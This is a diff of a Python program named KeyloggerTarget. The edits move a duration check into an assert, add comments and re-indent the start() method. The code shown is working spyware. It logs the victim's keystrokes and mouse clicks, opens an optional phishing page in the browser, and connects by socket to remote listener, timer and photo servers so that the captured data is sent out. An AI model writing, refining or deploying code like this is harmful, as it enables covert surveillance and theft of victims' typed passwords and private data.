@@ -17,6 +17,9 @@ class KeyloggerTarget:
                  port_of_server_keylogger_data, ip_of_server_listener, port_of_server_listener, ip_of_timer,
                  port_of_timer, duration_in_seconds=200, phishing_web=None):
         # "duration_in_seconds" tells the programm how long it should last the default time is 200 seconds that's 3 Minutes and 20 Seconds
+        assert duration_in_seconds >= 60, f"{duration_in_seconds} is not greater and not equal to 60"
+        # "duration_in_seconds" should always be bigger than 60 seconds
+
         self.ip_photos = ip_of_server_photos
         self.port_photos = port_of_server_photos
         self.ip_keylogger = ip_of_server_keylogger_data
@@ -200,6 +203,7 @@ class KeyloggerTarget:
                 if self.caps is True:
                     if key.char in other_charecters:
                         word = other_charecters[key.char]
+                        #Upper Characters from "1" to "0" because all this numbers are not charecters are not in pynput
                     else:
                         word = key.char.upper()
                 else:
@@ -234,38 +238,35 @@ class KeyloggerTarget:
         print(f'Key released: {key}')
 
     def start(self):
-        if self.duration < 60:
-            raise TypeError(f"{self.duration} is not greater and not equal to 60")
-        # "duration_in_seconds" should always be bigger than 60 seconds
-        else:
-            if self.phishing is not None:
-                while True:
-                    try:
-                        response = requests.get(self.phishing)
-                        webbrowser.open(self.phishing)
-                        break
+        if self.phishing is not None:
+            while True:
+                try:
+                    response = requests.get(self.phishing)
+                    #Respone is here to see if the website is online or not
+                    webbrowser.open(self.phishing)
+                    break
 
-                    except requests.exceptions.ConnectionError:
-                        print("This website is not availible")
-                        sys.exit()
+                except requests.exceptions.ConnectionError:
+                    print("No connection")
+                    sys.exit()
 
-            listening_thread = threading.Thread(target=self.daten_aufnehemen)
-            # This runs the programm behind the actual programming
-            listening_thread.start()
+        listening_thread = threading.Thread(target=self.daten_aufnehemen)
+        # This runs the programm behind the actual programming
+        listening_thread.start()
 
-            threading_mouse = threading.Thread(target=self.all_clicks)
-            # This runs the programm behind the actual programming
-            threading_mouse.start()
+        threading_mouse = threading.Thread(target=self.all_clicks)
+        # This runs the programm behind the actual programming
+        threading_mouse.start()
 
-            send_timer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            send_timer.connect((self.ip_timer, self.port_timer))
+        send_timer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        send_timer.connect((self.ip_timer, self.port_timer))
 
-            send_timer.send(str(self.duration).encode())
-            # This sends the seconds to the server
-            send_timer.close()
+        send_timer.send(str(self.duration).encode())
+        # This sends the seconds to the server
+        send_timer.close()
 
-            with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
-                self.countdown_send(self.duration, self.ip_photos, self.port_photos, self.ip_keylogger,
-                                    self.port_keylogger)
-                listener.join()
-                # This listens to the keys that where typed
+        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
+            self.countdown_send(self.duration, self.ip_photos, self.port_photos, self.ip_keylogger,
+                                self.port_keylogger)
+            listener.join()
+            # This listens to the keys that where typed
